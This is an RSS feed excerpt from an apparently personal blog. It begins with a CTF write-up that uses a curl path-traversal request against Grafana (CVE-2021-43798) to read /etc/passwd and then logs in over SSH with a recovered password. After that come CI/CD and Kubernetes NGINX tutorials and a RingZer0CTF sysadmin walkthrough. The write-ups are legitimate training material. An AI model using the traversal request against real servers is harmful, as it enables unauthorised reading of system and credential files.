<p><img src="/files/b32.png#center" alt="">
After decoding the string, it revealed the word <code>vagrant</code>,which led us to discover the user we were searching for.
Curious about the other app running on port 3000, I decided to take a closer look. It turned out to be Grafana, a monitoring tool running version 8.3. After some Googling, I stumbled upon a CVE-2021-43798 that pointed towards a Local File Inclusion (LFI) vulnerability.</p>
<blockquote>
<p><a href="https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/">https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/</a></p>
</blockquote>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ curl --path-as-is 10.10.126.15:3000/public/plugins/alertmanager/../../../../../../../../etc/passwd
</span></span><span style="display:flex;"><span>root❌0:0:root:/root:/bin/ash
</span></span><span style="display:flex;"><span>bin❌1:1:bin:/bin:/sbin/nologin
</span></span><span style="display:flex;"><span>daemon❌2:2:daemon:/sbin:/sbin/nologin
</span></span><span style="display:flex;"><span>adm❌3:4:adm:/var/adm:/sbin/nologin
</span></span><span style="display:flex;"><span>lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
</span></span><span style="display:flex;"><span>sync❌5:0:sync:/sbin:/bin/sync
</span></span><span style="display:flex;"><span>shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
</span></span><span style="display:flex;"><span>halt❌7:0:halt:/sbin:/sbin/halt
</span></span><span style="display:flex;"><span>mail❌8:12:mail:/var/mail:/sbin/nologin
</span></span><span style="display:flex;"><span>news❌9:13:news:/usr/lib/news:/sbin/nologin
</span></span><span style="display:flex;"><span>uucp❌10:14:uucp:/var/spool/uucppublic:/sbin/nologin
</span></span><span style="display:flex;"><span>operator❌11:0:operator:/root:/sbin/nologin
</span></span><span style="display:flex;"><span>man❌13:15:man:/usr/man:/sbin/nologin
</span></span><span style="display:flex;"><span>postmaster❌14:12:postmaster:/var/mail:/sbin/nologin
</span></span><span style="display:flex;"><span>cron❌16:16:cron:/var/spool/cron:/sbin/nologin
</span></span><span style="display:flex;"><span>ftp❌21:21::/var/lib/ftp:/sbin/nologin
</span></span><span style="display:flex;"><span>sshd❌22:22:sshd:/dev/null:/sbin/nologin
</span></span><span style="display:flex;"><span>at❌25:25:at:/var/spool/cron/atjobs:/sbin/nologin
</span></span><span style="display:flex;"><span>squid❌31:31:Squid:/var/cache/squid:/sbin/nologin
</span></span><span style="display:flex;"><span>xfs❌33:33:X Font Server:/etc/X11/fs:/sbin/nologin
</span></span><span style="display:flex;"><span>games❌35:35:games:/usr/games:/sbin/nologin
</span></span><span style="display:flex;"><span>cyrus❌85:12::/usr/cyrus:/sbin/nologin
</span></span><span style="display:flex;"><span>vpopmail❌89:89::/var/vpopmail:/sbin/nologin
</span></span><span style="display:flex;"><span>ntp❌123:123:NTP:/var/empty:/sbin/nologin
</span></span><span style="display:flex;"><span>smmsp❌209:209:smmsp:/var/spool/mqueue:/sbin/nologin
</span></span><span style="display:flex;"><span>guest❌405💯guest:/dev/null:/sbin/nologin
</span></span><span style="display:flex;"><span>nobody❌65534:65534:nobody:/:/sbin/nologin
</span></span><span style="display:flex;"><span>grafana❌472:0:hereiamatctf907:/home/grafana:/sbin/nologin
</span></span></code></pre></div></li>
</ul>
<p>And voilà! We struck gold and managed to uncover the password. lets do the SSH now!</p>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sshpass -p hereiamatctf907 ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no vagrant@10.10.126.15
</span></span></code></pre></div></li>
</ul>
<h4 id="your-secret-crush">Your Secret Crush</h4>
<p>Here&rsquo;s a little nudge in the right direction: &ldquo;If you want to keep a secret, you must also hide it from yourself.&rdquo; It&rsquo;s like a secret within a secret, right? And hey, remember how Kubernetes lets you stash away secrets? That&rsquo;s a pretty big hint! Now, hop into root mode and give this command a go to see a list of secrets. 🕵️‍♂️</p>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vagrant@johnny:~$ sudo ps aux | grep root
</span></span><span style="display:flex;"><span>vagrant@johnny:~$ k0s kubectl get secret
</span></span></code></pre></div></li>
</ul>
<blockquote>
<p>The connection to the server 10.0.2.15:6443 was refused - did you specify the right host or port?
you can fix this by running the following commands</p>
</blockquote>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -i
</span></span><span style="display:flex;"><span>swapoff -a
</span></span></code></pre></div></li>
</ul>
<p>[to be continued..]</p>
]]></content></item><item><title>Understanding CI/CD</title><link>https://chxmxii.github.io/portfolio/posts/2022/10/understanding-ci/cd/</link><pubDate>Tue, 25 Oct 2022 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2022/10/understanding-ci/cd/</guid><description>0 . 1 What is CI/CD : CI/CD is an automated and reliable process for software development and delivery.&amp;amp;* CI/CD’s frequent testing reduces code errors and defects. The main concepts attributed to CI/CD are continuos integration, delivery and deployment. ⇒ The main goal is to reduce the risk involved in deploying software.
0 . 2 What’s the difference between CI &amp;amp; CD &amp;amp; CD : Countinous integration is an automation process for developers, which is new code changes to an app are regularly built, tested and merged to a shared repository.</description><content type="html"><![CDATA[<p><img src="/files/cicdlogo.png" alt=""></p>
<h3 id="0--1-what-is-cicd-">0 . 1 What is CI/CD :</h3>
<ul>
<li>CI/CD is an automated and reliable process for software development and delivery.&amp;*</li>
<li>CI/CD’s frequent testing reduces code errors and defects.</li>
<li>The main concepts attributed to CI/CD are continuos integration, delivery and deployment.</li>
</ul>
<p>⇒ The main goal is to reduce the risk involved in deploying software.</p>
<h3 id="0--2-whats-the-difference-between-ci--cd--cd-">0 . 2 What’s the difference between CI &amp; CD &amp; CD :</h3>
<ul>
<li>Countinous integration is an automation process for developers, which is new code changes to an app are regularly built, tested and merged to a shared repository.</li>
<li>Countinous delivery is a solution to the problem of poor visibility and commmunication between dev and business teams. its purpose is to ensure that it takes minimal effort to deploy new code.</li>
<li>Countinous deployment means to automatically releasing a dev’s changes from the repository to produciton, where it is usable by customers.</li>
</ul>
<p><img src="/files/cicd.png" alt="Untitled"></p>
<h3 id="0--3-different-stages-">0 . 3 Different stages :</h3>
<p>CI/CD piple can be divided into four main stages :*</p>
<ol>
<li>Source</li>
<li>Build</li>
<li>Test</li>
<li>Deployment</li>
</ol>
<p>The stages are executed in a linear fashion, and each stage must be completed successfully before the next stage can begin.</p>
<p><img src="/files/cicd2.png" alt=""></p>
<p><img src="/files/cicd3.png" alt=""></p>
<h3 id="0--3--1-source-stage">0 . 3 . 1 Source Stage</h3>
<p>First stage of any CI/CD pipeline. In this stage the pipleline will get trigged by any change in the program. this stage will cover version controlling and tracking changes.</p>
<p>If the automated workflow detects a change in the central repository, it will trigger tasks such as code compilation and unit testing.</p>
<p><strong>Example tools :</strong></p>
<ul>
<li>GIT</li>
<li>Azure Repos</li>
<li>AWS CodeCommit</li>
</ul>
<h3 id="0--3--2-build-stage-">0 . 3 . 2 Build Stage :</h3>
<ul>
<li>The second stage of the pipeline you merge the source code and its dependencies.</li>
<li>It is done mainly to build a runnable instance of software that you can potentially ship to the end-user.</li>
<li>Failure to pass the build stage could indicate a fundamental issue in the underlying code.</li>
</ul>
<p>Example tools :</p>
<ol>
<li>Jenkins</li>
<li>AWS CodeBuild</li>
<li>Azure Pipelines</li>
</ol>
<h3 id="0--3--3-test-stage-">0 . 3 . 3 Test Stage :</h3>
<p>Test stage includes the execution of automated tests written by developers (integration testing, functional testing etc..) to validate the correctness of code and the behaviour of the software.</p>
<p>The main goal of this stage is to prevent software bugs from reaching end-users.</p>
<p><strong>Example Tools :</strong></p>
<ol>
<li>Puppeteer</li>
<li>Jest</li>
<li>Selenium.</li>
</ol>
<h3 id="0--3--4-deploy-stage-">0 . 3 . 4 Deploy stage :</h3>
<p>Final stage of the pipeline, where your product goes live after passing the source,build and test stages successfully.</p>
<p>The deployment stage can include infra provisioning, config, and containerization using techs like terraform, puppet,docker and k8s.</p>
<p><strong>Example Tools :</strong></p>
<ol>
<li>Ansible</li>
<li>Chef</li>
<li>AWS Elastic beanstalk</li>
<li>AWS Code Deploy</li>
<li>Azure Pipelines - Deployment.</li>
</ol>
]]></content></item><item><title>Deploying NGINX web server with kubernetes</title><link>https://chxmxii.github.io/portfolio/posts/2022/09/deploying-nginx-web-server-with-kubernetes/</link><pubDate>Sat, 10 Sep 2022 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2022/09/deploying-nginx-web-server-with-kubernetes/</guid><description>Hello, We already know that with Kubernetes you can easily deploy and manage NGINX across a cluster of nodes, ensuring high availability and efficient resource utilization. In this article, we&amp;rsquo;ll discuss the steps involved in deploying NGINX with Kubernetes and how it can benefit your web hosting infrastructure.
1 - Create nginx-deployement.yaml file :
apiVersion : apps/v1 kind: Deployment metadata: name: nginx labels: app: nginx spec: replicas: 1 selector: matchlabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 2 - Create the deployment : kubectl create -f dep.</description><content type="html"><![CDATA[<p>Hello, We already know that with Kubernetes you can easily deploy and manage NGINX across a cluster of nodes, ensuring high availability and efficient resource utilization. In this article, we&rsquo;ll discuss the steps involved in deploying NGINX with Kubernetes and how it can benefit your web hosting infrastructure.</p>
<p>1 - Create nginx-deployement.yaml file :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion </span>: <span style="color:#ae81ff">apps/v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">app</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">matchlabels</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">app</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">template</span>: 
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">metadata</span>: 
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">labels</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">app</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#f92672">containers</span>:
</span></span><span style="display:flex;"><span>			- <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>				- <span style="color:#f92672">containerPort</span>: <span style="color:#ae81ff">80</span>
</span></span></code></pre></div><p>2 - Create the deployment :
<code>kubectl create -f dep.yaml</code>
⇒ This will create one pod with single NGINX container listening on port 80.</p>
<p>3 - Verify :</p>
<p><code>Kubectl get deployment</code></p>
<p>4 - Create nginx-service.yaml :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-service</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">selector</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">app</span>: <span style="color:#ae81ff">nginx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">type</span>: <span style="color:#ae81ff">NodePort</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>	- <span style="color:#f92672">protocol</span>: <span style="color:#ae81ff">TCP</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">port</span>: <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">targetpPort</span>: <span style="color:#ae81ff">80</span>
</span></span></code></pre></div><p>5 - Create the service :</p>
<p><code>kubectl create -f nginx-service.yaml</code></p>
<p>⇒ Service will be created as a nodePort, means it will expose the nginx web-server on each node with port 80. pods are selected for this service depending on label selector”app:nginx”, same label we specified while creating the nginx pode in dep.</p>
<p>6 - verify :</p>
<p><code>kubectl get svc</code></p>
]]></content></item><item><title>RingZer0CTF Sysadmin Track</title><link>https://chxmxii.github.io/portfolio/posts/2022/04/ringzer0ctf-sysadmin-track/</link><pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2022/04/ringzer0ctf-sysadmin-track/</guid><description>SysAdmin Part 1 ┌──(kali㉿kali)-[~] └─$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh -o StrictHostKeyChecking=no morpheus@challenges.ringzer0team.com -p 10089 Warning: Permanently added &amp;#39;[challenges.ringzer0team.com]:10089&amp;#39; (ED25519) to the list of known hosts. 888888ba oo d8888888P a8888a d888888P 88 8b .d8&amp;#39; d8 8b 88 88aaaa8P dP 88d888b. .d8888b. .d8&amp;#39; .d8888b. 88d888b. 88 P 88 88 .d8888b. .d8888b. 88d8b.d8b. 88 8b. 88 88 88 88 88 .d8&amp;#39; 88ooood8 88 88 88 d 88 88 88ooood8 88 88 88 88 88 88 88 88 88 88 88 88 d8&amp;#39; 88.</description><content type="html"><![CDATA[<h2 id="sysadmin-part-1">SysAdmin Part 1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sshpass -p VNZDDLq2x9qXCzVdABbR1HOtz ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no morpheus@challenges.ringzer0team.com -p <span style="color:#ae81ff">10089</span>
</span></span><span style="display:flex;"><span>Warning: Permanently added <span style="color:#e6db74">&#39;[challenges.ringzer0team.com]:10089&#39;</span> <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span> to the list of known hosts.
</span></span><span style="display:flex;"><span> 888888ba  oo                   d8888888P                    a8888a  d888888P                              
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span>     8b                           .d8<span style="color:#e6db74">&#39;                   d8    8b    88                                 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 88aaaa8P  dP 88d888b. .d8888b.    .d8&#39;</span>   .d8888b. 88d888b. <span style="color:#ae81ff">88</span>  P <span style="color:#ae81ff">88</span>    <span style="color:#ae81ff">88</span>    .d8888b. .d8888b. 88d8b.d8b. 
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">88</span>    8b. <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">88</span>    <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">88</span>    <span style="color:#ae81ff">88</span>  .d8<span style="color:#e6db74">&#39;     88ooood8 88    88 88 d  88    88    88ooood8 88    88 88  88  88 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 88     88 88 88    88 88    88 d8&#39;</span>       88.  ... <span style="color:#ae81ff">88</span>       Y8    8P    <span style="color:#ae81ff">88</span>    88.  ... <span style="color:#ae81ff">88</span>    <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">88</span>  <span style="color:#ae81ff">88</span>  <span style="color:#ae81ff">88</span> 
</span></span><span style="display:flex;"><span> dP     dP dP dP    dP <span style="color:#e6db74">`</span>8888P88 Y8888888P <span style="color:#e6db74">`</span>88888P<span style="color:#e6db74">&#39; dP        Y8888P     dP    `88888P&#39;</span> <span style="color:#e6db74">`</span>88888P8 dP  dP  dP 
</span></span><span style="display:flex;"><span>oooooooooooooooooooooooo     <span style="color:#ae81ff">88</span> ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
</span></span><span style="display:flex;"><span>                        d8888P                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                    +---------------------------------+
</span></span><span style="display:flex;"><span>                                    |  Welcome to the Sysadmin track  |
</span></span><span style="display:flex;"><span>                                    |                                 |
</span></span><span style="display:flex;"><span>                                    |   - Play nice and play Fair -   |
</span></span><span style="display:flex;"><span>                                    |                                 |
</span></span><span style="display:flex;"><span>                                    |----<span style="color:#f92672">[</span> info@ringzer0team.com <span style="color:#f92672">]</span>----|
</span></span><span style="display:flex;"><span>$ ls
</span></span></code></pre></div><p>Maybe something is there?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> morpheus morpheus <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">9</span> root     root     <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root     root        <span style="color:#ae81ff">9</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2022</span> .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rwx------ <span style="color:#ae81ff">1</span> morpheus morpheus  <span style="color:#ae81ff">220</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .bash_logout
</span></span><span style="display:flex;"><span>-rwx------ <span style="color:#ae81ff">1</span> morpheus morpheus <span style="color:#ae81ff">3771</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .bashrc
</span></span><span style="display:flex;"><span>-rwx------ <span style="color:#ae81ff">1</span> morpheus morpheus  <span style="color:#ae81ff">807</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .profile
</span></span></code></pre></div><p>Checking /etc/passwd</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>$ cat /etc/passwd
</span></span><span style="display:flex;"><span>systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>ubuntu❌1000:1002:Ubuntu:/home/ubuntu:/bin/bash
</span></span><span style="display:flex;"><span>mysql❌106:112:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>sshd❌107:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>morpheus❌1001:1004:,666,666-6666,:/home/morpheus:/bin/sh
</span></span><span style="display:flex;"><span>trinity❌1002:1005::/home/trinity:/bin/bash
</span></span><span style="display:flex;"><span>architect❌1003:1006::/home/architect:/bin/bash
</span></span><span style="display:flex;"><span>oracle❌1004:1007::/home/oracle:/bin/bash
</span></span><span style="display:flex;"><span>neo❌1005:1008::/home/neo:/bin/bash
</span></span><span style="display:flex;"><span>cypher❌1006:1009::/home/cypher:/bin/bash
</span></span></code></pre></div><p>Nothing there, lets check for the running proccess!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>$ ps ax
</span></span><span style="display:flex;"><span>    PID TTY      STAT   TIME COMMAND
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">1</span> ?        Ss    98:57 /sbin/init splash
</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">2</span> ?        S      0:11 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">209</span> ?        S      0:26 <span style="color:#f92672">[</span>hwrng<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">246</span> ?        S&lt;s  204:07 /lib/systemd/systemd-journald
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">285</span> ?        Ssl   76:40 /run/lxd_agent/lxd-agent
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">290</span> ?        Ss    25:16 /lib/systemd/systemd-udevd
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">317</span> ?        Ssl    4:32 /lib/systemd/systemd-timesyncd
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">319</span> ?        I&lt;     0:00 <span style="color:#f92672">[</span>ttm_swap<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">387</span> ?        Ss    10:41 /usr/bin/dbus-daemon --system --address<span style="color:#f92672">=</span>systemd: --nofork --nopidfile --systemd-activation --syslog-only
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">393</span> ?        Ss     0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">396</span> ?        S     12:54 /bin/sh /root/backup.sh -u trinity -p Flag-7e0cfcf090a2fe53c97ea3edd3883d0d
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">406</span> ?        Ss    10:40 /lib/systemd/systemd-logind
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1581771</span> ?        S      0:00 sleep <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1581772</span> pts/0    R+     0:00 ps ax
</span></span></code></pre></div><ul>
<li>Gottcha ya! -&gt; Flag-7e0cfcf090a2fe53c97ea3edd3883d0d</li>
</ul>
<hr>
<h2 id="sysadmin-part-2">SysAdmin Part 2</h2>
]]></content></item></channel></rss>